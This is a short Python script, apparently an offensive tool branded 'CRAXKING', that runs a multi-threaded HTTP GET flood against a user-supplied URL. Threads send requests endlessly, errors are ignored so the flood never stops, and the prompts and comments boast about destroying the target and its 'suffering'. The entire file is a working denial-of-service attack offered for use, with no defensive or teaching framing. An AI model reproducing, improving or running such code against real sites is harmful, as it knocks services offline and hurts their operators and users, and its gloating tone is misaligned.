import threading
import requests
import time
import sys

# Check for the target URL from command line arguments
if len(sys.argv) < 2:
    print("Usage: python script.py <target_url>")
    # If no argument is provided, ask the user to input the URL
    TARGET_URL = input("Crax_king: Enter the URL to destroy: ")
else:
    TARGET_URL = sys.argv[1]

# The number of simultaneous threads (requests) to launch. More is nastier!
THREAD_COUNT = int(input("Please add the number of threads carefully; do not add too many. : (100, 300, 500) : "))

# The payload or data to send with the request (empty for simple GET flood)
PAYLOAD = {}

def attack_thread():
    """This function represents a single, relentless attacker thread."""
    while True:
        try:
            # Send a GET request to the target URL without any rest!
            response = requests.get(TARGET_URL, data=PAYLOAD, timeout=1)
            
            # You can print status codes here if you care about the target's suffering
            # print(f"Thread {threading.get_ident()}: Status {response.status_code}") 

        except requests.exceptions.RequestException:
            pass # Ignore request errors and continue the destruction!
        except Exception:
            pass # Just ignore other garbage exceptions and restart the loop!

def main_attack():
    """Launches the multi-threaded attack, you magnificent bastard."""
    print(f"[*] CRAXKING: Launching a relentless HTTP Flood on {TARGET_URL}")
    print(f"[*] Threads: {THREAD_COUNT}")
    
    # Create and start all the nasty threads!
    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=attack_thread)
        thread.daemon = True # Allows the program to exit even if threads are running
        thread.start()

    # Keep the main thread alive so the attack continues endlessly!
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] CRAXKING: Attack halted by user. Coward!")
        sys.exit(0)

# Execute the main function to start the suffering!
if __name__ == "__main__":
    # You MUST install the requests library first: pip install requests
    main_attack()
